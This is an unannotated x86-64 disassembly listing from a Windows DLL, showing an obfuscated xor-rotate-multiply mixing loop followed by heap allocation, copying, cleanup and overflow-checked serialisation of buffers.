   18000493e:	44 33 d0             	xor    %eax,%r10d
   180004941:	0f b7 85 da 05 00 00 	movzwl 0x5da(%rbp),%eax
   180004948:	41 8b ca             	mov    %r10d,%ecx
   18000494b:	41 2b cd             	sub    %r13d,%ecx
   18000494e:	0f af c8             	imul   %eax,%ecx
   180004951:	41 8b c2             	mov    %r10d,%eax
   180004954:	c1 e8 06             	shr    $0x6,%eax
   180004957:	2b c8                	sub    %eax,%ecx
   180004959:	44 33 d9             	xor    %ecx,%r11d
   18000495c:	0f b7 8d de 05 00 00 	movzwl 0x5de(%rbp),%ecx
   180004963:	41 8b c3             	mov    %r11d,%eax
   180004966:	c1 c8 0f             	ror    $0xf,%eax
   180004969:	33 c6                	xor    %esi,%eax
   18000496b:	41 0f af c5          	imul   %r13d,%eax
   18000496f:	44 33 d0             	xor    %eax,%r10d
   180004972:	41 8b c2             	mov    %r10d,%eax
   180004975:	f7 d0                	not    %eax
   180004977:	c1 c8 03             	ror    $0x3,%eax
   18000497a:	03 c1                	add    %ecx,%eax
   18000497c:	0f af c6             	imul   %esi,%eax
   18000497f:	44 33 d8             	xor    %eax,%r11d
   180004982:	41 8b c3             	mov    %r11d,%eax
   180004985:	2b 85 dc 05 00 00    	sub    0x5dc(%rbp),%eax
   18000498b:	41 2b c5             	sub    %r13d,%eax
   18000498e:	44 33 d0             	xor    %eax,%r10d
   180004991:	41 8b c2             	mov    %r10d,%eax
   180004994:	41 8b ca             	mov    %r10d,%ecx
   180004997:	33 45 80             	xor    -0x80(%rbp),%eax
   18000499a:	0f af 44 24 58       	imul   0x58(%rsp),%eax
   18000499f:	c1 c9 0a             	ror    $0xa,%ecx
   1800049a2:	33 c8                	xor    %eax,%ecx
   1800049a4:	44 33 d9             	xor    %ecx,%r11d
   1800049a7:	41 8b cb             	mov    %r11d,%ecx
   1800049aa:	41 8b c3             	mov    %r11d,%eax
   1800049ad:	41 33 cd             	xor    %r13d,%ecx
   1800049b0:	c1 c8 03             	ror    $0x3,%eax
   1800049b3:	c1 c1 06             	rol    $0x6,%ecx
   1800049b6:	0f af ce             	imul   %esi,%ecx
   1800049b9:	33 c8                	xor    %eax,%ecx
   1800049bb:	44 33 d1             	xor    %ecx,%r10d
   1800049be:	0f b7 8d de 05 00 00 	movzwl 0x5de(%rbp),%ecx
   1800049c5:	41 8b c2             	mov    %r10d,%eax
   1800049c8:	c1 c8 0f             	ror    $0xf,%eax
   1800049cb:	2b c1                	sub    %ecx,%eax
   1800049cd:	41 0f af c5          	imul   %r13d,%eax
   1800049d1:	44 33 d8             	xor    %eax,%r11d
   1800049d4:	0f b7 85 de 05 00 00 	movzwl 0x5de(%rbp),%eax
   1800049db:	41 8b cb             	mov    %r11d,%ecx
   1800049de:	33 c8                	xor    %eax,%ecx
   1800049e0:	41 8b c3             	mov    %r11d,%eax
   1800049e3:	41 0f af cd          	imul   %r13d,%ecx
   1800049e7:	d1 e8                	shr    $1,%eax
   1800049e9:	33 c8                	xor    %eax,%ecx
   1800049eb:	41 8b c3             	mov    %r11d,%eax
   1800049ee:	44 33 d1             	xor    %ecx,%r10d
   1800049f1:	c1 e8 0f             	shr    $0xf,%eax
   1800049f4:	41 8b cb             	mov    %r11d,%ecx
   1800049f7:	2b ce                	sub    %esi,%ecx
   1800049f9:	c1 c1 03             	rol    $0x3,%ecx
   1800049fc:	41 0f af cd          	imul   %r13d,%ecx
   180004a00:	33 c8                	xor    %eax,%ecx
   180004a02:	0f b7 85 da 05 00 00 	movzwl 0x5da(%rbp),%eax
   180004a09:	44 33 d1             	xor    %ecx,%r10d
   180004a0c:	41 8b ca             	mov    %r10d,%ecx
   180004a0f:	2b ce                	sub    %esi,%ecx
   180004a11:	0f af c8             	imul   %eax,%ecx
   180004a14:	41 8b c2             	mov    %r10d,%eax
   180004a17:	c1 e8 0d             	shr    $0xd,%eax
   180004a1a:	2b c8                	sub    %eax,%ecx
   180004a1c:	44 33 d9             	xor    %ecx,%r11d
   180004a1f:	8b cb                	mov    %ebx,%ecx
   180004a21:	41 2b cb             	sub    %r11d,%ecx
   180004a24:	41 8b c3             	mov    %r11d,%eax
   180004a27:	c1 c9 09             	ror    $0x9,%ecx
   180004a2a:	c1 c8 0b             	ror    $0xb,%eax
   180004a2d:	0f af ce             	imul   %esi,%ecx
   180004a30:	33 c8                	xor    %eax,%ecx
   180004a32:	44 33 d1             	xor    %ecx,%r10d
   180004a35:	0f b7 8d de 05 00 00 	movzwl 0x5de(%rbp),%ecx
   180004a3c:	41 8b c2             	mov    %r10d,%eax
   180004a3f:	2b c3                	sub    %ebx,%eax
   180004a41:	2b c1                	sub    %ecx,%eax
   180004a43:	44 33 d8             	xor    %eax,%r11d
   180004a46:	41 8b c3             	mov    %r11d,%eax
   180004a49:	41 8b cb             	mov    %r11d,%ecx
   180004a4c:	33 44 24 58          	xor    0x58(%rsp),%eax
   180004a50:	c1 c9 07             	ror    $0x7,%ecx
   180004a53:	41 0f af c5          	imul   %r13d,%eax
   180004a57:	2b c1                	sub    %ecx,%eax
   180004a59:	44 33 d0             	xor    %eax,%r10d
   180004a5c:	0f b7 85 de 05 00 00 	movzwl 0x5de(%rbp),%eax
   180004a63:	41 8b ca             	mov    %r10d,%ecx
   180004a66:	33 c8                	xor    %eax,%ecx
   180004a68:	0f b7 85 da 05 00 00 	movzwl 0x5da(%rbp),%eax
   180004a6f:	c1 c1 04             	rol    $0x4,%ecx
   180004a72:	0f af c8             	imul   %eax,%ecx
   180004a75:	41 8b c2             	mov    %r10d,%eax
   180004a78:	c1 c8 10             	ror    $0x10,%eax
   180004a7b:	2b c8                	sub    %eax,%ecx
   180004a7d:	44 33 d9             	xor    %ecx,%r11d
   180004a80:	8b cb                	mov    %ebx,%ecx
   180004a82:	41 2b cb             	sub    %r11d,%ecx
   180004a85:	41 8b c3             	mov    %r11d,%eax
   180004a88:	c1 c9 0a             	ror    $0xa,%ecx
   180004a8b:	0f af ce             	imul   %esi,%ecx
   180004a8e:	c1 c8 04             	ror    $0x4,%eax
   180004a91:	03 c8                	add    %eax,%ecx
   180004a93:	0f b7 85 de 05 00 00 	movzwl 0x5de(%rbp),%eax
   180004a9a:	44 33 d1             	xor    %ecx,%r10d
   180004a9d:	41 8b ca             	mov    %r10d,%ecx
   180004aa0:	2b cb                	sub    %ebx,%ecx
   180004aa2:	c1 c9 04             	ror    $0x4,%ecx
   180004aa5:	0f af c8             	imul   %eax,%ecx
   180004aa8:	41 8b c2             	mov    %r10d,%eax
   180004aab:	c1 c8 09             	ror    $0x9,%eax
   180004aae:	33 c8                	xor    %eax,%ecx
   180004ab0:	44 33 d9             	xor    %ecx,%r11d
   180004ab3:	8b 8d dc 05 00 00    	mov    0x5dc(%rbp),%ecx
   180004ab9:	41 33 cb             	xor    %r11d,%ecx
   180004abc:	41 8b c3             	mov    %r11d,%eax
   180004abf:	c1 c1 08             	rol    $0x8,%ecx
   180004ac2:	41 0f af cd          	imul   %r13d,%ecx
   180004ac6:	c1 c0 02             	rol    $0x2,%eax
   180004ac9:	2b c8                	sub    %eax,%ecx
   180004acb:	0f b7 85 da 05 00 00 	movzwl 0x5da(%rbp),%eax
   180004ad2:	44 33 d1             	xor    %ecx,%r10d
   180004ad5:	8b 8d dc 05 00 00    	mov    0x5dc(%rbp),%ecx
   180004adb:	41 2b ca             	sub    %r10d,%ecx
   180004ade:	c1 c9 0b             	ror    $0xb,%ecx
   180004ae1:	0f af c8             	imul   %eax,%ecx
   180004ae4:	41 8b c2             	mov    %r10d,%eax
   180004ae7:	c1 c8 0c             	ror    $0xc,%eax
   180004aea:	2b c8                	sub    %eax,%ecx
   180004aec:	0f b7 85 da 05 00 00 	movzwl 0x5da(%rbp),%eax
   180004af3:	44 33 d9             	xor    %ecx,%r11d
   180004af6:	41 8b cb             	mov    %r11d,%ecx
   180004af9:	33 c8                	xor    %eax,%ecx
   180004afb:	41 8b c3             	mov    %r11d,%eax
   180004afe:	0f af ce             	imul   %esi,%ecx
   180004b01:	c1 e8 08             	shr    $0x8,%eax
   180004b04:	33 c8                	xor    %eax,%ecx
   180004b06:	44 33 d1             	xor    %ecx,%r10d
   180004b09:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   180004b0e:	45 33 da             	xor    %r10d,%r11d
   180004b11:	45 33 d7             	xor    %r15d,%r10d
   180004b14:	44 88 52 fc          	mov    %r10b,-0x4(%rdx)
   180004b18:	44 33 db             	xor    %ebx,%r11d
   180004b1b:	44 33 9d dc 05 00 00 	xor    0x5dc(%rbp),%r11d
   180004b22:	45 8b f9             	mov    %r9d,%r15d
   180004b25:	44 33 df             	xor    %edi,%r11d
   180004b28:	41 c1 ca 08          	ror    $0x8,%r10d
   180004b2c:	44 88 1a             	mov    %r11b,(%rdx)
   180004b2f:	41 8b f8             	mov    %r8d,%edi
   180004b32:	44 88 52 fb          	mov    %r10b,-0x5(%rdx)
   180004b36:	41 c1 cb 08          	ror    $0x8,%r11d
   180004b3a:	44 88 5a ff          	mov    %r11b,-0x1(%rdx)
   180004b3e:	41 c1 ca 08          	ror    $0x8,%r10d
   180004b42:	44 88 52 fa          	mov    %r10b,-0x6(%rdx)
   180004b46:	41 c1 cb 08          	ror    $0x8,%r11d
   180004b4a:	44 88 5a fe          	mov    %r11b,-0x2(%rdx)
   180004b4e:	41 c1 ca 08          	ror    $0x8,%r10d
   180004b52:	41 c1 cb 08          	ror    $0x8,%r11d
   180004b56:	44 88 52 f9          	mov    %r10b,-0x7(%rdx)
   180004b5a:	44 88 5a fd          	mov    %r11b,-0x3(%rdx)
   180004b5e:	49 03 d4             	add    %r12,%rdx
   180004b61:	41 c1 cb 08          	ror    $0x8,%r11d
   180004b65:	41 c1 ca 08          	ror    $0x8,%r10d
   180004b69:	49 83 ee 01          	sub    $0x1,%r14
   180004b6d:	0f 85 03 fd ff ff    	jne    0x180004876
   180004b73:	8a 54 24 34          	mov    0x34(%rsp),%dl
   180004b77:	48 bf 5e 60 69 ab 7f 	movabs $0x7f1137fab69605e,%rdi
   180004b7e:	13 f1 07 
   180004b81:	4c 8b 6d e0          	mov    -0x20(%rbp),%r13
   180004b85:	41 bf 0e 00 07 80    	mov    $0x8007000e,%r15d
   180004b8b:	48 8b 75 a0          	mov    -0x60(%rbp),%rsi
   180004b8f:	4c 8b 75 b0          	mov    -0x50(%rbp),%r14
   180004b93:	4c 8d 46 08          	lea    0x8(%rsi),%r8
   180004b97:	0f b6 c2             	movzbl %dl,%eax
   180004b9a:	49 89 04 36          	mov    %rax,(%r14,%rsi,1)
   180004b9e:	4c 89 b5 d8 01 00 00 	mov    %r14,0x1d8(%rbp)
   180004ba5:	4c 89 85 90 05 00 00 	mov    %r8,0x590(%rbp)
   180004bac:	48 8d 05 3d b6 03 00 	lea    0x3b63d(%rip),%rax        # 0x1800401f0
   180004bb3:	4c 89 a5 a0 05 00 00 	mov    %r12,0x5a0(%rbp)
   180004bba:	48 89 85 98 05 00 00 	mov    %rax,0x598(%rbp)
   180004bc1:	48 8d 05 88 b5 03 00 	lea    0x3b588(%rip),%rax        # 0x180040150
   180004bc8:	48 c7 85 08 05 00 00 	movq   $0xa0,0x508(%rbp)
   180004bcf:	a0 00 00 00 
   180004bd3:	48 89 85 a8 05 00 00 	mov    %rax,0x5a8(%rbp)
   180004bda:	48 ff 15 cf 5d 03 00 	rex.W call *0x35dcf(%rip)        # 0x18003a9b0
   180004be1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004be6:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   180004bec:	41 8b d4             	mov    %r12d,%edx
   180004bef:	48 8b c8             	mov    %rax,%rcx
   180004bf2:	48 ff 15 af 5d 03 00 	rex.W call *0x35daf(%rip)        # 0x18003a9a8
   180004bf9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004bfe:	45 33 db             	xor    %r11d,%r11d
   180004c01:	48 8b f0             	mov    %rax,%rsi
   180004c04:	48 85 c0             	test   %rax,%rax
   180004c07:	75 0b                	jne    0x180004c14
   180004c09:	41 be 17 00 00 c0    	mov    $0xc0000017,%r14d
   180004c0f:	e9 04 02 00 00       	jmp    0x180004e18
   180004c14:	8b 45 90             	mov    -0x70(%rbp),%eax
   180004c17:	89 06                	mov    %eax,(%rsi)
   180004c19:	48 ff 15 90 5d 03 00 	rex.W call *0x35d90(%rip)        # 0x18003a9b0
   180004c20:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004c25:	4c 8b 45 90          	mov    -0x70(%rbp),%r8
   180004c29:	41 8b d4             	mov    %r12d,%edx
   180004c2c:	45 8b c0             	mov    %r8d,%r8d
   180004c2f:	48 8b c8             	mov    %rax,%rcx
   180004c32:	48 ff 15 6f 5d 03 00 	rex.W call *0x35d6f(%rip)        # 0x18003a9a8
   180004c39:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004c3e:	45 33 db             	xor    %r11d,%r11d
   180004c41:	48 8b c8             	mov    %rax,%rcx
   180004c44:	48 85 c0             	test   %rax,%rax
   180004c47:	75 0b                	jne    0x180004c54
   180004c49:	41 be 17 00 00 c0    	mov    $0xc0000017,%r14d
   180004c4f:	e9 f4 00 00 00       	jmp    0x180004d48
   180004c54:	48 89 4e 08          	mov    %rcx,0x8(%rsi)
   180004c58:	4c 8b 45 90          	mov    -0x70(%rbp),%r8
   180004c5c:	49 8b d6             	mov    %r14,%rdx
   180004c5f:	45 8b c0             	mov    %r8d,%r8d
   180004c62:	e8 8b 49 03 00       	call   0x1800395f2
   180004c67:	41 be a0 00 00 00    	mov    $0xa0,%r14d
   180004c6d:	44 89 76 10          	mov    %r14d,0x10(%rsi)
   180004c71:	48 ff 15 38 5d 03 00 	rex.W call *0x35d38(%rip)        # 0x18003a9b0
   180004c78:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004c7d:	45 8b c6             	mov    %r14d,%r8d
   180004c80:	41 8b d4             	mov    %r12d,%edx
   180004c83:	48 8b c8             	mov    %rax,%rcx
   180004c86:	48 ff 15 1b 5d 03 00 	rex.W call *0x35d1b(%rip)        # 0x18003a9a8
   180004c8d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004c92:	45 33 db             	xor    %r11d,%r11d
   180004c95:	48 8b c8             	mov    %rax,%rcx
   180004c98:	48 85 c0             	test   %rax,%rax
   180004c9b:	74 ac                	je     0x180004c49
   180004c9d:	48 89 46 18          	mov    %rax,0x18(%rsi)
   180004ca1:	48 8d 05 a8 b4 03 00 	lea    0x3b4a8(%rip),%rax        # 0x180040150
   180004ca8:	0f 10 00             	movups (%rax),%xmm0
   180004cab:	41 8d 56 e0          	lea    -0x20(%r14),%edx
   180004caf:	0f 11 01             	movups %xmm0,(%rcx)
   180004cb2:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   180004cb6:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   180004cba:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   180004cbe:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   180004cc2:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   180004cc6:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   180004cca:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   180004cce:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   180004cd2:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   180004cd6:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   180004cda:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   180004cde:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   180004ce2:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   180004ce6:	0f 11 4c 11 f0       	movups %xmm1,-0x10(%rcx,%rdx,1)
   180004ceb:	0f 10 04 10          	movups (%rax,%rdx,1),%xmm0
   180004cef:	0f 11 04 11          	movups %xmm0,(%rcx,%rdx,1)
   180004cf3:	0f 10 4c 10 10       	movups 0x10(%rax,%rdx,1),%xmm1
   180004cf8:	0f 11 4c 11 10       	movups %xmm1,0x10(%rcx,%rdx,1)
   180004cfd:	44 89 66 20          	mov    %r12d,0x20(%rsi)
   180004d01:	48 ff 15 a8 5c 03 00 	rex.W call *0x35ca8(%rip)        # 0x18003a9b0
   180004d08:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004d0d:	4d 8b c4             	mov    %r12,%r8
   180004d10:	41 8b d4             	mov    %r12d,%edx
   180004d13:	48 8b c8             	mov    %rax,%rcx
   180004d16:	48 ff 15 8b 5c 03 00 	rex.W call *0x35c8b(%rip)        # 0x18003a9a8
   180004d1d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004d22:	45 33 db             	xor    %r11d,%r11d
   180004d25:	48 8b c8             	mov    %rax,%rcx
   180004d28:	48 85 c0             	test   %rax,%rax
   180004d2b:	0f 84 18 ff ff ff    	je     0x180004c49
   180004d31:	48 89 46 28          	mov    %rax,0x28(%rsi)
   180004d35:	48 8b 05 b4 b4 03 00 	mov    0x3b4b4(%rip),%rax        # 0x1800401f0
   180004d3c:	4c 8b ee             	mov    %rsi,%r13
   180004d3f:	48 89 01             	mov    %rax,(%rcx)
   180004d42:	45 8b f3             	mov    %r11d,%r14d
   180004d45:	41 8b f3             	mov    %r11d,%esi
   180004d48:	48 85 f6             	test   %rsi,%rsi
   180004d4b:	0f 84 c7 00 00 00    	je     0x180004e18
   180004d51:	48 8b 46 08          	mov    0x8(%rsi),%rax
   180004d55:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   180004d5a:	48 85 c0             	test   %rax,%rax
   180004d5d:	74 29                	je     0x180004d88
   180004d5f:	48 ff 15 4a 5c 03 00 	rex.W call *0x35c4a(%rip)        # 0x18003a9b0
   180004d66:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004d6b:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
   180004d70:	33 d2                	xor    %edx,%edx
   180004d72:	48 8b c8             	mov    %rax,%rcx
   180004d75:	48 ff 15 24 5c 03 00 	rex.W call *0x35c24(%rip)        # 0x18003a9a0
   180004d7c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004d81:	45 33 db             	xor    %r11d,%r11d
   180004d84:	4c 89 5e 08          	mov    %r11,0x8(%rsi)
   180004d88:	48 8b 46 18          	mov    0x18(%rsi),%rax
   180004d8c:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   180004d91:	48 85 c0             	test   %rax,%rax
   180004d94:	74 29                	je     0x180004dbf
   180004d96:	48 ff 15 13 5c 03 00 	rex.W call *0x35c13(%rip)        # 0x18003a9b0
   180004d9d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004da2:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
   180004da7:	33 d2                	xor    %edx,%edx
   180004da9:	48 8b c8             	mov    %rax,%rcx
   180004dac:	48 ff 15 ed 5b 03 00 	rex.W call *0x35bed(%rip)        # 0x18003a9a0
   180004db3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004db8:	45 33 db             	xor    %r11d,%r11d
   180004dbb:	4c 89 5e 18          	mov    %r11,0x18(%rsi)
   180004dbf:	48 8b 46 28          	mov    0x28(%rsi),%rax
   180004dc3:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   180004dc8:	48 85 c0             	test   %rax,%rax
   180004dcb:	74 28                	je     0x180004df5
   180004dcd:	48 ff 15 dc 5b 03 00 	rex.W call *0x35bdc(%rip)        # 0x18003a9b0
   180004dd4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004dd9:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
   180004dde:	33 d2                	xor    %edx,%edx
   180004de0:	48 8b c8             	mov    %rax,%rcx
   180004de3:	48 ff 15 b6 5b 03 00 	rex.W call *0x35bb6(%rip)        # 0x18003a9a0
   180004dea:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004def:	33 c0                	xor    %eax,%eax
   180004df1:	48 89 46 28          	mov    %rax,0x28(%rsi)
   180004df5:	48 ff 15 b4 5b 03 00 	rex.W call *0x35bb4(%rip)        # 0x18003a9b0
   180004dfc:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004e01:	4c 8b c6             	mov    %rsi,%r8
   180004e04:	33 d2                	xor    %edx,%edx
   180004e06:	48 8b c8             	mov    %rax,%rcx
   180004e09:	48 ff 15 90 5b 03 00 	rex.W call *0x35b90(%rip)        # 0x18003a9a0
   180004e10:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004e15:	45 33 db             	xor    %r11d,%r11d
   180004e18:	45 85 f6             	test   %r14d,%r14d
   180004e1b:	78 12                	js     0x180004e2f
   180004e1d:	4c 89 ad 00 01 00 00 	mov    %r13,0x100(%rbp)
   180004e24:	4d 8b eb             	mov    %r11,%r13
   180004e27:	eb 06                	jmp    0x180004e2f
   180004e29:	41 be 01 00 00 c0    	mov    $0xc0000001,%r14d
   180004e2f:	48 8b b5 d8 01 00 00 	mov    0x1d8(%rbp),%rsi
   180004e36:	48 85 f6             	test   %rsi,%rsi
   180004e39:	74 2a                	je     0x180004e65
   180004e3b:	48 ff 15 6e 5b 03 00 	rex.W call *0x35b6e(%rip)        # 0x18003a9b0
   180004e42:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004e47:	4c 8b c6             	mov    %rsi,%r8
   180004e4a:	33 d2                	xor    %edx,%edx
   180004e4c:	48 8b c8             	mov    %rax,%rcx
   180004e4f:	48 ff 15 4a 5b 03 00 	rex.W call *0x35b4a(%rip)        # 0x18003a9a0
   180004e56:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004e5b:	45 33 db             	xor    %r11d,%r11d
   180004e5e:	4c 89 9d d8 01 00 00 	mov    %r11,0x1d8(%rbp)
   180004e65:	4d 85 ed             	test   %r13,%r13
   180004e68:	0f 84 b2 00 00 00    	je     0x180004f20
   180004e6e:	49 8b 75 08          	mov    0x8(%r13),%rsi
   180004e72:	48 85 f6             	test   %rsi,%rsi
   180004e75:	74 27                	je     0x180004e9e
   180004e77:	48 ff 15 32 5b 03 00 	rex.W call *0x35b32(%rip)        # 0x18003a9b0
   180004e7e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004e83:	4c 8b c6             	mov    %rsi,%r8
   180004e86:	33 d2                	xor    %edx,%edx
   180004e88:	48 8b c8             	mov    %rax,%rcx
   180004e8b:	48 ff 15 0e 5b 03 00 	rex.W call *0x35b0e(%rip)        # 0x18003a9a0
   180004e92:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004e97:	45 33 db             	xor    %r11d,%r11d
   180004e9a:	4d 89 5d 08          	mov    %r11,0x8(%r13)
   180004e9e:	49 8b 75 18          	mov    0x18(%r13),%rsi
   180004ea2:	48 85 f6             	test   %rsi,%rsi
   180004ea5:	74 27                	je     0x180004ece
   180004ea7:	48 ff 15 02 5b 03 00 	rex.W call *0x35b02(%rip)        # 0x18003a9b0
   180004eae:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004eb3:	4c 8b c6             	mov    %rsi,%r8
   180004eb6:	33 d2                	xor    %edx,%edx
   180004eb8:	48 8b c8             	mov    %rax,%rcx
   180004ebb:	48 ff 15 de 5a 03 00 	rex.W call *0x35ade(%rip)        # 0x18003a9a0
   180004ec2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004ec7:	45 33 db             	xor    %r11d,%r11d
   180004eca:	4d 89 5d 18          	mov    %r11,0x18(%r13)
   180004ece:	49 8b 75 28          	mov    0x28(%r13),%rsi
   180004ed2:	48 85 f6             	test   %rsi,%rsi
   180004ed5:	74 26                	je     0x180004efd
   180004ed7:	48 ff 15 d2 5a 03 00 	rex.W call *0x35ad2(%rip)        # 0x18003a9b0
   180004ede:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004ee3:	4c 8b c6             	mov    %rsi,%r8
   180004ee6:	33 d2                	xor    %edx,%edx
   180004ee8:	48 8b c8             	mov    %rax,%rcx
   180004eeb:	48 ff 15 ae 5a 03 00 	rex.W call *0x35aae(%rip)        # 0x18003a9a0
   180004ef2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004ef7:	33 c0                	xor    %eax,%eax
   180004ef9:	49 89 45 28          	mov    %rax,0x28(%r13)
   180004efd:	48 ff 15 ac 5a 03 00 	rex.W call *0x35aac(%rip)        # 0x18003a9b0
   180004f04:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004f09:	4d 8b c5             	mov    %r13,%r8
   180004f0c:	33 d2                	xor    %edx,%edx
   180004f0e:	48 8b c8             	mov    %rax,%rcx
   180004f11:	48 ff 15 88 5a 03 00 	rex.W call *0x35a88(%rip)        # 0x18003a9a0
   180004f18:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004f1d:	45 33 db             	xor    %r11d,%r11d
   180004f20:	41 81 ce 00 00 00 10 	or     $0x10000000,%r14d
   180004f27:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   180004f2c:	0f 8c a7 02 00 00    	jl     0x1800051d9
   180004f32:	4c 8b ad 00 01 00 00 	mov    0x100(%rbp),%r13
   180004f39:	41 8b 4d 00          	mov    0x0(%r13),%ecx
   180004f3d:	45 8b 45 20          	mov    0x20(%r13),%r8d
   180004f41:	83 c1 04             	add    $0x4,%ecx
   180004f44:	41 8b 55 10          	mov    0x10(%r13),%edx
   180004f48:	83 f9 04             	cmp    $0x4,%ecx
   180004f4b:	0f 82 3f 01 00 00    	jb     0x180005090
   180004f51:	8d 41 04             	lea    0x4(%rcx),%eax
   180004f54:	3b c1                	cmp    %ecx,%eax
   180004f56:	0f 82 34 01 00 00    	jb     0x180005090
   180004f5c:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
   180004f5f:	3b c8                	cmp    %eax,%ecx
   180004f61:	0f 82 29 01 00 00    	jb     0x180005090
   180004f67:	8d 41 04             	lea    0x4(%rcx),%eax
   180004f6a:	3b c1                	cmp    %ecx,%eax
   180004f6c:	0f 82 1e 01 00 00    	jb     0x180005090
   180004f72:	42 8d 0c 00          	lea    (%rax,%r8,1),%ecx
   180004f76:	3b c8                	cmp    %eax,%ecx
   180004f78:	0f 82 12 01 00 00    	jb     0x180005090
   180004f7e:	89 8d 54 01 00 00    	mov    %ecx,0x154(%rbp)
   180004f84:	8b f1                	mov    %ecx,%esi
   180004f86:	48 ff 15 23 5a 03 00 	rex.W call *0x35a23(%rip)        # 0x18003a9b0
   180004f8d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004f92:	44 8b c6             	mov    %esi,%r8d
   180004f95:	41 8b d4             	mov    %r12d,%edx
   180004f98:	48 8b c8             	mov    %rax,%rcx
   180004f9b:	48 ff 15 06 5a 03 00 	rex.W call *0x35a06(%rip)        # 0x18003a9a8
   180004fa2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004fa7:	48 8b f0             	mov    %rax,%rsi
   180004faa:	48 85 c0             	test   %rax,%rax
   180004fad:	75 11                	jne    0x180004fc0
   180004faf:	41 be 17 00 00 c0    	mov    $0xc0000017,%r14d
   180004fb5:	41 bd 95 00 00 c0    	mov    $0xc0000095,%r13d
   180004fbb:	e9 d9 00 00 00       	jmp    0x180005099
   180004fc0:	41 8b 45 00          	mov    0x0(%r13),%eax
   180004fc4:	4c 8d 76 04          	lea    0x4(%rsi),%r14
   180004fc8:	89 06                	mov    %eax,(%rsi)
   180004fca:	4c 3b f6             	cmp    %rsi,%r14
   180004fcd:	0f 82 89 00 00 00    	jb     0x18000505c
   180004fd3:	45 8b 45 00          	mov    0x0(%r13),%r8d
   180004fd7:	49 8b ce             	mov    %r14,%rcx
   180004fda:	49 8b 55 08          	mov    0x8(%r13),%rdx
   180004fde:	e8 0f 46 03 00       	call   0x1800395f2
   180004fe3:	41 8b 4d 00          	mov    0x0(%r13),%ecx
   180004fe7:	49 03 ce             	add    %r14,%rcx
   180004fea:	49 3b ce             	cmp    %r14,%rcx
   180004fed:	72 6d                	jb     0x18000505c
   180004fef:	41 8b 45 10          	mov    0x10(%r13),%eax
   180004ff3:	4c 8d 71 04          	lea    0x4(%rcx),%r14
   180004ff7:	89 01                	mov    %eax,(%rcx)
   180004ff9:	4c 3b f1             	cmp    %rcx,%r14
   180004ffc:	72 5e                	jb     0x18000505c
   180004ffe:	45 8b 45 10          	mov    0x10(%r13),%r8d
   180005002:	49 8b ce             	mov    %r14,%rcx
   180005005:	49 8b 55 18          	mov    0x18(%r13),%rdx
   180005009:	e8 e4 45 03 00       	call   0x1800395f2
   18000500e:	41 8b 4d 10          	mov    0x10(%r13),%ecx
   180005012:	49 03 ce             	add    %r14,%rcx
   180005015:	49 3b ce             	cmp    %r14,%rcx
   180005018:	72 42                	jb     0x18000505c
   18000501a:	41 8b 45 20          	mov    0x20(%r13),%eax
   18000501e:	4c 8d 71 04          	lea    0x4(%rcx),%r14
   180005022:	89 01                	mov    %eax,(%rcx)
   180005024:	4c 3b f1             	cmp    %rcx,%r14
   180005027:	72 33                	jb     0x18000505c
   180005029:	45 8b 45 20          	mov    0x20(%r13),%r8d
   18000502d:	49 8b ce             	mov    %r14,%rcx
   180005030:	49 8b 55 28          	mov    0x28(%r13),%rdx
   180005034:	e8 b9 45 03 00       	call   0x1800395f2
   180005039:	41 8b 45 20          	mov    0x20(%r13),%eax
   18000503d:	49 03 c6             	add    %r14,%rax
   180005040:	49 3b c6             	cmp    %r14,%rax
   180005043:	72 17                	jb     0x18000505c
